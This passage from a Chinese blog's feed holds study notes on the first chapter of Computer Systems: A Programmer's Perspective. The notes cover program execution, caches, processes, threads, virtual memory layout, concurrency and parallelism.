title="程序的运行"></a>程序的运行</h4><ul><li><p>初识时，shell程序执行它的指令，等待我们输入一个命令。当我们在键盘上输入字符串<code>./hello</code>时，shell程序将字符逐一读入寄存器，再把它存放到内存中。</p></li><li><p>当我们在键盘上敲回车键时，shell程序就知道我们已经结束了命令的输入，然后shell执行一系列指令来加载可执行的hello文件，这些指令将hello目标文件中的代码和数据从磁盘复制到主存。</p></li><li>通过DMA，数据可以不通过处理器而直接从磁盘到达主存。</li><li>一旦hello中的代码和数据被加载到主存，处理器就开始执行hello程序中的main程序中的机器语言指令，这些指令将”hello,world\n”字符串中的字节从主存复制到寄存器文件，再从寄存器文件中复制到显示设备。最终显示在屏幕上。</li></ul><h4 id="高速缓存的重要性"><a href="#高速缓存的重要性" class="headerlink" title="高速缓存的重要性"></a>高速缓存的重要性</h4><p>没有高速缓存，系统将会花费大量的时间把信息从一个地方挪到另一个地方，例如机器指令从磁盘复制到主存，从主存复制到处理器。数据也是如此，从磁盘复制到主存，从主存复制到显示设备。根据机械原理，较大的存储设备要比较小的存储设备运行的慢。类似的，一个典型的寄存器文件只存储几百字节的信息，而主存里可存放几十亿字节，然而，处理器从寄存器文件中读取数据比从主存中读取数据几乎要快100倍。随着近几年半导体技术的进步，这种处理器与主存之间的差距还在持续增大。针对这种处理器与主存之间的差异，系统设计者采用了更小更快的存储设备。称为高速缓存存储器。作为暂时的集结区域，存放处理器近期可能会需要的信息。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/3.png" alt="3"></p><h4 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h4><p>我们可以把操作系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。<br>操作系统有两个基本功能</p><ul><li><p>防止硬件被失控的应用程序滥用</p></li><li><p>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备</p></li></ul><p>操作系统通过几个基本的抽象概念（进程、虚拟内存和文件）来实现这两个功能，其中，文件是对I/O设备的抽象表示，虚拟内存是对主存和磁盘I/O设备的抽象表示，进程则是对处理器、主存和I/O设备的抽象表示。</p><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。并发运行，则是说一个进程的指令和另一个进程的指令是交错执行的，在大多数系统中，需要运行的进程数是多于可以运行它们的CPU个数的。传统系统在一个时刻只能执行一个程序，而先进的多核处理器同时能够执行多个程序。这具体的表现在，无论是在单核还是在多核系统中，一个CPU看上去都像是在并发的执行多个进程，这是通过处理器在进程间切换来实现的，操作系统实现这种交错执行的机制称为上下文切换。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/4.png" alt="4"></p><p>如上图所示，从一个进程到另一个进程的转换是通过操作系统内核来管理的，内核是操作系统代码常驻主存的部分，当应用程序需要操作系统的某些操作时，比如读写文件，它就执行一条特殊的系统调用指令，将控制权传递给内核，然后内核执行被请求的操作并返回应用程序。（内核不是一个独立的进程，它是系统管理全部进程所用代码和数据结构的集合）</p><h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><p>一个进程实际上可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。多线程之间比多进程之间更容易共享数据，并且线程一般来说都比进程更高效，当有多处理器可用的时候，多线程也是一种使得程序可以运行得更快的方法。</p><h4 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h4><p>虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存，每个进程看到的内存都是一致的，称为虚拟地址空间。在Linux中，地址空间最上面的区域时保留给操作系统中的代码和数据的，这对所有进程来说都是一样的，地址空间的底部区域存放用户进程定义的代码和数据。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/5.png" alt="5"></p><ul><li><strong>程序代码和数据</strong>。对所有的进程来说，代码是从同一固定地址开始，紧接着的是和C全局变量相对应的数据位置，代码和数据去是直接按照可执行目标文件的内容初始化的。</li><li><strong>堆</strong>。代码和数据去后紧随着的是运行时堆，代码和数据去在进程一开始运行时就被指定了大小，而调用像malloc和free这样的C标准库函数时，堆可以在运行时动态地扩展和收缩。</li><li><strong>共享库</strong>。大约在地址空间的中间部分时一块用来存放像C标准库和数学库这样的共享库的代码和数据的区域。</li><li><strong>栈</strong>。位于用户虚拟地址空间顶部的是用户栈，编译器用它来实现函数调用，和堆一样，用户栈在程序执行期间可以动态地扩展和收缩，特别的，每次我们调用一个函数时，栈就会增长，从一个函数返回时，栈就会收缩。</li><li><strong>内核虚拟内存</strong>。地址空间顶部的区域是为内核保留的，不允许应用程序读写这个区域的内容或者直接调用内核代码定义的函数。</li></ul><h4 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h4><h5 id="线程级并发"><a href="#线程级并发" class="headerlink" title="线程级并发"></a>线程级并发</h5><p>使用线程，我们能够在一个进程汇总执行多个控制流，自20世纪60年代初期出现时间共享以来，计算机系统中就开始有了对并发执行的支持。传统意义上，这种并发执行只是模拟出来的，是通过使一台计算机在它正在执行的进程间快速切换来实现的。在以前，即使处理器必须在多个任务间切换，大多数实际的计算也都是由一个处理器来完成的，这种配置称为<strong>单处理器系统</strong>。当构建一个由单操作系统内核控制的多处理器组成的系统时，我们就得到了一个<strong>多处理器系统</strong>。多核处理器是将多个CPU集成到一个集成电路芯片上，如下图所示为多核处理器的组织架构。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/6.png" alt="6"></p><h5 id="指令级并行"><a href="#指令级并行" class="headerlink" title="指令级并行"></a>指令级并行</h5><p>在较低的抽象层次上，现代处理器可以同时执行多条指令的属性称为指令级并行。通过使用流水线技术，将执行一条指令所需要的活动划分为不同的步骤，将处理器的硬件组织成一系列的阶段，每个阶段执行一个步骤。这些阶段可以并行地操作，用来处理不同指令的不同部分。</p><h5 id="单指令、多数据并行"><a href="#单指令、多数据并行" class="headerlink" title="单指令、多数据并行"></a>单指令、多数据并行</h5><p>在最低层次上，许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。</p><h4 id="计算机系统的抽象表示"><a href="#计算机系统的抽象表示" class="headerlink" title="计算机系统的抽象表示"></a>计算机系统的抽象表示</h4><p><img src="/2021/09/16/深入理解计算机系统（一）/7.png" alt="7"></p><p>计算机系统提供了不同层次的抽象表示来隐藏实际实现的复杂性。如上图所示，在处理器里，指令集架构提供了对实际处理器硬件的抽象，使用这个抽象，机器代码程序表现的好像运行在一个一次只执行一条指令的处理器上。对于我们而言，底层的硬件要比抽象描述更加复杂，它并行的执行多条指令，但又总是与那个简单有序的模型保持一致，只要执行模型一样，不同的处理器实现也能执行同样的机器代码，而又提供不同的开销和性能。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;系统漫游&quot;&gt;&lt;a href=&quot;#系统漫游&quot; class=&quot;headerlink&quot; title=&quot;系统漫游&quot;&gt;&lt;/a&gt;系统漫游&lt;/h3&gt;&lt;h4 id=&quot;Hello-world&quot;&gt;&lt;a href=&quot;#Hello-world&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
